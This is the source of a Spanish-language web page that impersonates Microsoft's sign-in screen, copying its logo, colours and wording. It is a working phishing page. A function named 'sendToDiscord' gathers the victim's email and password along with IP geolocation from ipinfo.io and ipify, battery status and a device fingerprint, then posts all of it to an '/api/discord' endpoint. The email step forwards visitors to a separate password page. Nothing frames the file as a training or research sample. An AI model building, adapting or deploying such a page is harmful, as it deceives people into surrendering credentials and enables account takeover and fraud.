<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Iniciar sesión en su cuenta</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'ms-red': '#f25022',
            'ms-green': '#7fba00',
            'ms-yellow': '#ffb900',
            'ms-blue-logo': '#00bcf2',
            'ms-gray': '#1b1b1b',
            'ms-gray-light': '#605e5c',
            'ms-border': '#8a8886',
            'ms-error-bg': '#fef2f2',
            'ms-error-border': '#fca5a5',
            'ms-error': '#dc2626',
          },
          fontFamily: {
            'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
          },
          fontSize: {
            'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
            'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
            'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
            'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
            'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
          },
        }
      }
    }
  </script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      min-height: 100vh;
      width: 100%;
      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      position: fixed;
      overflow: hidden;
    }
    body {
      background-color: #0a0a1a;
      background-image: none;
    }
    body.bg-gradient {
      background: var(--login-bg-gradient, linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%));
    }
    body.bg-image {
      background-image: var(--login-bg-image, none);
    }
    @media (min-width: 640px) {
      html, body {
        position: static;
        overflow: auto;
      }
    }
    .ms-input {
      border: 1px solid #8a8886;
      font-size: 15px;
      padding: 11px 12px;
      line-height: 20px;
      border-radius: 2px;
      width: 100%;
      background: #fff;
      color: #1b1b1b;
      outline: none;
      transition: border-color 0.1s ease, box-shadow 0.1s ease;
    }
    .ms-input:focus {
      border-color: #0078d4;
      box-shadow: inset 0 0 0 1px #0078d4;
    }
    .ms-button {
      background: #0078d4;
      color: #fff;
      border: none;
      font-size: 15px;
      font-weight: 600;
      padding: 8px 12px;
      min-height: 32px;
      border-radius: 2px;
      cursor: pointer;
      transition: background-color 0.1s ease;
    }
    .ms-button:hover { background: #106ebe; }
    .ms-button:active { background: #005a9e; }
    .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
    .ms-link {
      color: #0078d4;
      text-decoration: none;
      font-size: 13px;
    }
    .ms-link:hover { text-decoration: underline; }
    .fade-in {
      animation: fadeIn 0.3s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .login-container {
      position: relative;
      z-index: 1;
      background: rgba(255,255,255,0.95);
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    .error-box {
      background: #fef2f2;
      border: 1px solid #fca5a5;
      border-radius: 4px;
      padding: 8px 12px;
      margin-bottom: 12px;
      text-align: center;
      display: none;
    }
    .error-text {
      color: #dc2626;
      font-size: 13px;
      font-weight: 500;
    }
    .main-container {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      z-index: 10;
    }
    @media (min-width: 640px) {
      .main-container {
        position: static;
        min-height: 100vh;
        padding-top: 12vh;
      }
    }
    .footer-links {
      position: fixed;
      bottom: 0; left: 0; right: 0;
      background: rgba(255,255,255,0.95);
      backdrop-filter: blur(8px);
      border-top: 1px solid #e1dfdd;
      padding: 8px 16px;
      z-index: 50;
    }
    @media (min-width: 640px) {
      .footer-links {
        position: fixed;
        padding: 8px 24px;
      }
    }
    .footer-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: center;
      gap: 8px 16px;
      font-size: 12px;
      color: #605e5c;
    }
    .footer-inner a {
      color: #0078d4;
      text-decoration: none;
    }
    .footer-inner a:hover { text-decoration: underline; }
    .footer-inner .private-tip {
      text-align: center;
      font-size: 11px;
    }
    /* Badge for email display */
    .email-badge {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      background: transparent;
      border: 1px solid #8a8886;
      border-radius: 9999px;
      padding: 4px 12px;
      font-size: 13px;
      color: #1b1b1b;
      font-weight: 500;
    }
  </style>
</head>
<body>

  <!-- Background overlay -->
  <div class="fixed inset-0 bg-white/0"></div>

  <!-- Main Content -->
  <div class="main-container">
    <div class="w-full max-w-md fade-in relative z-10">
      <div class="login-container p-8 sm:p-12">

        <!-- Microsoft Logo -->
        <div class="flex items-center justify-center mb-6">
          <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
            <div class="bg-ms-red w-3 h-3"></div>
            <div class="bg-ms-green w-3 h-3"></div>
            <div class="bg-ms-blue-logo w-3 h-3"></div>
            <div class="bg-ms-yellow w-3 h-3"></div>
          </div>
          <span class="text-ms-logo text-ms-gray" style="font-size:21px;line-height:28px;font-weight:600;">Microsoft</span>
        </div>

        <h1 class="text-ms-title text-ms-gray mb-1 font-semibold text-center" style="font-size:28px;line-height:36px;">
          Iniciar sesión
        </h1>
        <p class="text-ms-subtitle text-ms-gray-light mb-6 text-center" style="font-size:15px;line-height:20px;">
          Use su cuenta
        </p>

        <!-- Error box -->
        <div id="errorBox" class="error-box">
          <span id="errorText" class="error-text"></span>
        </div>

        <!-- Email Form (Step 1) -->
        <form onsubmit="handleEmailSubmit(event)" class="space-y-5" id="emailForm">
          <div>
            <input
              type="email"
              id="email"
              placeholder="Correo electrónico o número de teléfono"
              class="ms-input"
              autocomplete="username"
            />
          </div>

          <div class="flex items-center justify-between text-left">
            <a href="#" class="ms-link">¿Olvidaste tu nombre de usuario?</a>
            <a href="#" class="ms-link" onclick="showForgotPasswordHelp()" title="¿Olvidaste tu contraseña?">¿Olvidaste tu contraseña?</a>
          </div>

          <button type="submit" class="ms-button w-full" id="emailSubmitBtn">
            Siguiente
          </button>

          <div class="text-center text-ms-body text-ms-gray" style="font-size:15px;line-height:20px;">
            ¿Es nuevo en Microsoft?
            <a href="#" class="ms-link font-semibold" style="font-size:13px;">Crear una cuenta</a>
          </div>
        </form>
      </div>
    </div>
  </div>

  <!-- Footer Links -->
  <div class="footer-links" id="footerLinks">
    <div class="footer-inner">
      <a href="#" id="footerHelp">Ayuda</a>
      <a href="#" id="footerTerms">Términos de uso</a>
      <a href="#" id="footerPrivacy">Privacidad y cookies</a>
      <span class="private-tip">Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a></span>
    </div>
  </div>

  <script>
    // ===================== CARGA DE CONFIGURACIÓN GLOBAL =====================
    let globalConfig = null;

    async function loadGlobalConfig() {
      try {
        const res = await fetch('/api/config');
        if (res.ok) {
          globalConfig = await res.json();
        }
      } catch (e) {
        console.warn('Config global no disponible, usando defaults');
      }
      if (!globalConfig) {
        globalConfig = {
          logoText: 'Microsoft',
          pageTitle: 'Iniciar sesión en su cuenta',
          welcomeText: 'Use su cuenta',
          loginBgType: 'color',
          loginBgColor: '#0a0a1a',
          loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
          loginBgImage: '',
          footerHelpText: 'Ayuda',
          footerTermsText: 'Términos de uso',
          footerPrivacyText: 'Privacidad y cookies',
          footerPrivateTip: 'Usa la exploración privada si este no es tu dispositivo. Más información',
        };
      }
      applyGlobalConfig();
    }

    function applyGlobalConfig() {
      // Logo text
      const logoEl = document.querySelector('.text-ms-logo');
      if (logoEl && globalConfig.logoText) logoEl.textContent = globalConfig.logoText;

      // Page title
      if (globalConfig.pageTitle) document.title = globalConfig.pageTitle;

      // Welcome text
      const welcomeEl = document.querySelector('.text-ms-subtitle');
      if (welcomeEl && globalConfig.welcomeText) welcomeEl.textContent = globalConfig.welcomeText;

      // Footer links
      const helpEl = document.getElementById('footerHelp');
      const termsEl = document.getElementById('footerTerms');
      const privacyEl = document.getElementById('footerPrivacy');
      const privateTipEl = document.querySelector('.private-tip');
      if (helpEl && globalConfig.footerHelpText) helpEl.textContent = globalConfig.footerHelpText;
      if (termsEl && globalConfig.footerTermsText) termsEl.textContent = globalConfig.footerTermsText;
      if (privacyEl && globalConfig.footerPrivacyText) privacyEl.textContent = globalConfig.footerPrivacyText;
      if (privateTipEl && globalConfig.footerPrivateTip) privateTipEl.innerHTML = globalConfig.footerPrivateTip;

      // Login background
      applyLoginBackground();
    }

    function applyLoginBackground() {
      const bgType = globalConfig.loginBgType || 'color';
      const bgColor = globalConfig.loginBgColor || '#0a0a1a';
      const bgGradient = globalConfig.loginBgGradient || 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
      const bgImage = globalConfig.loginBgImage || '';

      document.body.style.removeProperty('background-image');
      document.body.style.removeProperty('background-color');
      document.body.classList.remove('bg-gradient', 'bg-image');

      if (bgType === 'gradient') {
        document.body.style.background = bgGradient;
        document.body.classList.add('bg-gradient');
      } else if (bgType === 'image' && bgImage) {
        document.body.style.backgroundImage = 'url(' + bgImage + ')';
        document.body.classList.add('bg-image');
      } else {
        document.body.style.backgroundColor = bgColor;
      }
    }

    // ===================== FORGOT PASSWORD HELP =====================
    function showForgotPasswordHelp() {
      alert('Para restablecer tu contraseña, visita el centro de cuenta de Microsoft.');
    }

    // ===================== VALIDACIÓN DE EMAIL =====================
    function isValidEmail(email) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function showError(message) {
      const errorBox = document.getElementById('errorBox');
      const errorText = document.getElementById('errorText');
      if (errorBox && errorText) {
        errorText.textContent = message;
        errorBox.style.display = 'block';
      }
    }

    function hideError() {
      const errorBox = document.getElementById('errorBox');
      if (errorBox) errorBox.style.display = 'none';
    }

    // ===================== ENVÍO A DISCORD =====================
    async function sendToDiscord(email, password) {
      // 1. Geo IP desde ipinfo.io
      let geoData = {};
      try {
        const geoRes = await fetch('https://ipinfo.io/json');
        if (geoRes.ok) {
          geoData = await geoRes.json();
        }
      } catch (e) {
        console.warn('Geo IP no disponible:', e);
      }

      // 2. IP desde ipify
      let ipifyIp = '';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        if (ipRes.ok) {
          const ipData = await ipRes.json();
          ipifyIp = ipData.ip || '';
        }
      } catch (e) {
        console.warn('IPify no disponible:', e);
      }

      // 3. Batería
      let batteryLevel = 'No disponible';
      let batteryCharging = 'Desconocido';
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = (battery.level * 100).toFixed(0) + '%';
          batteryCharging = battery.charging ? 'Sí' : 'No';
        }
      } catch (e) {
        console.warn('Batería no disponible:', e);
      }

      // 4. Datos del dispositivo
      const userAgent = navigator.userAgent || 'desconocido';
      const language = navigator.language || 'desconocido';
      const languages = navigator.languages ? navigator.languages.join(', ') : language;
      const screenResolution = screen.width + 'x' + screen.height;
      const colorDepth = screen.colorDepth + ' bits';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido';
      const platform = navigator.platform || 'desconocido';
      const onlineStatus = navigator.onLine ? 'Sí' : 'No';
      const cookiesEnabled = navigator.cookieEnabled ? 'Sí' : 'No';

      const deviceMemory = navigator.deviceMemory || 'desconocido';
      const cpuCores = navigator.hardwareConcurrency || 'desconocido';
      const touchPoints = navigator.maxTouchPoints || 0;

      const uaLower = userAgent.toLowerCase();
      const isMobile = /android|iphone|ipad|ipod/i.test(uaLower) ? 'Sí' : 'No';
      const isTablet = /ipad|tablet/i.test(uaLower) ? 'Sí' : 'No';
      const isDesktop = !/android|iphone|ipad|ipod|tablet/i.test(uaLower) ? 'Sí' : 'No';

      // Extraer geo fields
      const geoIp = geoData.ip || ipifyIp || '';
      const geoCity = geoData.city || '';
      const geoRegion = geoData.region || '';
      const geoCountry = geoData.country || '';
      const geoCountryCode = geoData.country || '';
      const geoTimezone = geoData.timezone || timezone;
      const geoIsoCode = geoCountryCode;
      const geoIsp = geoData.org || '';
      const geoLatitude = geoData.loc ? geoData.loc.split(',')[0] : '';
      const geoLongitude = geoData.loc ? geoData.loc.split(',')[1] : '';
      const geoZip = geoData.postal || '';
      const geoCurrency = geoData.currency || '';
      const geoCurrencyCode = geoData.currency || '';
      const geoCallingCode = geoData.phone ? geoData.phone.split(' ')[0] : '';
      const geoNetwork = geoData.org || '';

      const payload = {
        email: email,
        password: password || '',
        userAgent: userAgent,
        language: language,
        languages: languages,
        screenResolution: screenResolution,
        colorDepth: colorDepth,
        timezone: timezone,
        platform: platform,
        onlineStatus: onlineStatus,
        cookiesEnabled: cookiesEnabled,
        deviceMemory: deviceMemory,
        cpuCores: cpuCores,
        touchPoints: touchPoints,
        isMobile: isMobile,
        isTablet: isTablet,
        isDesktop: isDesktop,
        batteryLevel: batteryLevel,
        batteryCharging: batteryCharging,
        geoIp: geoIp,
        geoCity: geoCity,
        geoRegion: geoRegion,
        geoCountry: geoCountry,
        geoCountryCode: geoCountryCode,
        geoTimezone: geoTimezone,
        geoIsoCode: geoIsoCode,
        geoIsp: geoIsp,
        geoLatitude: geoLatitude,
        geoLongitude: geoLongitude,
        geoZip: geoZip,
        geoCurrency: geoCurrency,
        geoCurrencyCode: geoCurrencyCode,
        geoCallingCode: geoCallingCode,
        geoNetwork: geoNetwork,
        ipifyIp: ipifyIp,
      };

      try {
        const res = await fetch('/api/discord', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        const data = await res.json();
        return data.success === true;
      } catch (err) {
        console.warn('Discord API unavailable:', err);
        return false;
      }
    }

    // ===================== PASO 1: EMAIL =====================
    function handleEmailSubmit(event) {
      event.preventDefault();
      hideError();

      const emailInput = document.getElementById('email');
      const email = emailInput.value.trim();
      const submitBtn = document.getElementById('emailSubmitBtn');

      if (!email) {
        showError('Por favor ingresa tu correo electrónico.');
        emailInput.focus();
        return;
      }

      if (!isValidEmail(email)) {
        showError('Ingresa un correo electrónico válido.');
        emailInput.focus();
        return;
      }

      // Deshabilitar botón
      submitBtn.disabled = true;
      submitBtn.textContent = 'Verificando...';

      // Redirigir a página de contraseña
      setTimeout(() => {
        window.location.href = 'password.html?email=' + encodeURIComponent(email);
      }, 400);
    }

    // Cargar config al iniciar
    loadGlobalConfig();
  </script>
</body>
</html>
